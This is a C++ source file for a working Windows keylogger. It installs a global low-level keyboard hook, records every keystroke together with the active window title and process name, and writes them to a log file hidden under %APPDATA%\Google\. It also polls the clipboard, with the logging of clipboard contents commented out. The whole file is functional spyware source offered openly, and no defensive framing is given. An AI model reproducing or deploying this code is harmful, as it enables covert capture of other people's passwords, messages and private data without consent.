// KeyboardHookSample.cpp : This file contains the 'main' function. Program execution begins and ends there.
// written by Bear...
//you can check your keylog in %APPDATA%\\Google\\log.log file
#include <stdio.h>
#include <locale>
#include <codecvt>
#include <iostream>
#include <fstream>

#include "util.h"
//c++ 20

#pragma warning(disable:4996)

namespace fs = std::filesystem;

static HHOOK _hookId = 0;
static wstring prevWinTitle = L"";
static wstring keyLog = L"";

static wstring logdir = format(L"{}\\Google\\", utf8_decode(string(getenv("appdata"))));
static wstring logfile = L"log.log";

#define LOG_PATH (logdir + logfile)


bool isCapsLockOn() {
	if ((GetKeyState(VK_CAPITAL) & 0x00001) != 0)
		return true;
	else
		return false;
}

void CtrlCPressed() {

	printf("[CTRL + C] Pressed\n");
}

void CtrlVPressed() {

	printf("[CTRL + V] Pressed\n");
}


void appendLog(wstring msg) {
	std::wofstream of(LOG_PATH, std::ios_base::app);
	if (of.is_open()) {
		of << endl;
		of << msg;
		of.close();
	}
}

LRESULT CALLBACK KeyboardHookproc(int code, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam != WM_KEYDOWN)
		return CallNextHookEx(_hookId, code, wParam, lParam);

	string pressedKey = "";
	//0-9
	if (p->vkCode >= 0x30 && p->vkCode <= 0x39) // 0~9
	{
		switch (p->vkCode) {
			// 0 ~ 9 with Shift Options.
		case 0x30: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = ')';     else pressedKey = '0';        break;
		case 0x31: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '!';     else pressedKey = '1';        break;
		case 0x32: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '@';     else pressedKey = '2';        break;
		case 0x33: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '#';     else pressedKey = '3';        break;
		case 0x34: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '$';     else pressedKey = '4';        break;
		case 0x35: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '%';     else pressedKey = '5';        break;
		case 0x36: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '^';     else pressedKey = '6';        break;
		case 0x37: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '&';     else pressedKey = '7';        break;
		case 0x38: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '*';     else pressedKey = '8';        break;
		case 0x39: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '(';     else pressedKey = '9';        break;

		case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '<';     else pressedKey = ',';        break;
		case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '>';     else pressedKey = '.';        break;
		case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '?';     else pressedKey = '/';        break;
		case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = ':';     else pressedKey = ';';        break;
		case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '"';     else pressedKey = '\'';        break;
		case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '|';     else pressedKey = '\\';        break;
		case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '{';     else pressedKey = '[';        break;
		case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '}';     else pressedKey = ']';        break;
		case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '~';     else pressedKey = '`';        break;
		case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '_';     else pressedKey = '-';        break;
		case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '+';     else pressedKey = '=';        break;
		}
	}
	//a-z
	else if (p->vkCode >= 0x41 && p->vkCode <= 0x5A) // a~z
	{
		if (GetAsyncKeyState(VK_SHIFT) || isCapsLockOn()) {
			pressedKey = (char)p->vkCode;
		}
		else
			pressedKey = char(tolower(p->vkCode));

		if (GetAsyncKeyState(VK_CONTROL) && p->vkCode == 'C') {
			CtrlCPressed();
		}
		if (GetAsyncKeyState(VK_CONTROL) && p->vkCode == 'V') {
			CtrlVPressed();
		}
	}
	//F[] Key
	else if (p->vkCode >= VK_F1 && p->vkCode <= VK_F24) // F1 ~ F12.
	{
		pressedKey = std::format("[F{}]", p->vkCode - 111);
	}
	//Num Keys
	else if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9) {
		if (GetKeyState(VK_NUMLOCK)) {
			pressedKey = (char)(p->vkCode - VK_NUMPAD0 + '0');
		}
	}
	//other Keys
	else if (p->vkCode)
	{
		switch (p->vkCode)
		{
		case VK_CAPITAL:    pressedKey = "<CAPLOCK>";        break;
		case VK_LCONTROL:   pressedKey = "<LCTRL>";      break;
		case VK_RCONTROL:   pressedKey = "<RCTRL>";      break;
		case VK_INSERT:     pressedKey = "<INSERT>";     break;
		case VK_END:        pressedKey = "<END>";            break;
		case VK_HOME:        pressedKey = "<HOME>";            break;
		case VK_PRIOR:        pressedKey = "<PGUP>";            break;
		case VK_NEXT:        pressedKey = "<PGDOWN>";            break;
		case VK_PRINT:      pressedKey = "<PRINT>";      break;
		case VK_DELETE:     pressedKey = "<DEL>";            break;
		case VK_BACK:       pressedKey = "<BACK>";         break;
		case VK_LEFT:       pressedKey = "<LEFT>";       break;
		case VK_RIGHT:      pressedKey = "<RIGHT>";      break;
		case VK_UP:         pressedKey = "<UP>";         break;
		case VK_DOWN:       pressedKey = "<DOWN>";       break;
		case VK_SPACE:      pressedKey = ' ';                break;
		case VK_ESCAPE:     pressedKey = "<ESC>";            break;
		case VK_TAB:        pressedKey = "<TAB>";            break;
		case VK_RETURN:		pressedKey = "<Enter>\n"; break;
		case VK_MULTIPLY:	pressedKey = "*"; break;
		case VK_ADD:		pressedKey = "+"; break;
		case VK_SUBTRACT:	pressedKey = "-"; break;
		case VK_DIVIDE:		pressedKey = "/"; break;
		case VK_DECIMAL:	pressedKey = "."; break;

		case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '<';     else pressedKey = ',';        break;
		case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '>';     else pressedKey = '.';        break;
		case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '?';     else pressedKey = '/';        break;
		case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = ':';     else pressedKey = ';';        break;
		case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '"';     else pressedKey = '\'';        break;
		case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '|';     else pressedKey = '\\';        break;
		case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '{';     else pressedKey = '[';        break;
		case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '}';     else pressedKey = ']';        break;
		case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '~';     else pressedKey = '`';        break;
		case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '_';     else pressedKey = '-';        break;
		case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) pressedKey = '+';     else pressedKey = '=';        break;
		default:
			break;
		}
	}

	if (!pressedKey.empty()) {
		wstring activeWinTitle = GetActiveWindowTitle();
		if (activeWinTitle != prevWinTitle) {
			appendLog(keyLog);

			wstring activeProcName = GetActiveProcessName();

			wstring info = std::format(L"\n\n\n{}\nProcess: {}\nWindow: {}\n",
				utf8_decode(timestring()),
				activeProcName,
				activeWinTitle);

			appendLog(info);

			prevWinTitle = activeWinTitle;
			keyLog = L"";
		}
		keyLog += utf8_decode(pressedKey);
	}

	return CallNextHookEx(_hookId, code, wParam, lParam);
}

DWORD WINAPI KbHookThread(LPVOID lpParam)
{
	_hookId = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookproc, 0, 0);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(_hookId);
	return 0;
}

DWORD WINAPI HookClipboardThread(LPVOID lpParam)
{
	string prevtxt = "";
	while (true) {
		string msg = GetClipboardText();
		if (msg != prevtxt) {
			//printf("clipboard data changed!\n");
			/*appendLog(L"Clipboard data is");
			appendLog(utf8_decode(msg));
			appendLog(L"");*/
			prevtxt = msg;
		}
		Sleep(10);
	}
}
bool StartKeyboardHook() {
	if (!fs::exists(logdir))
		fs::create_directory(logdir);

	CreateThread(0, 0, HookClipboardThread, 0, 0, 0);
	return NULL != CreateThread(0, 0, KbHookThread, 0, 0, 0);
}
int main()
{
    std::cout << "Hello World!\n";
	StartKeyboardHook();
	while (true) {
		Sleep(1000);
	}
}

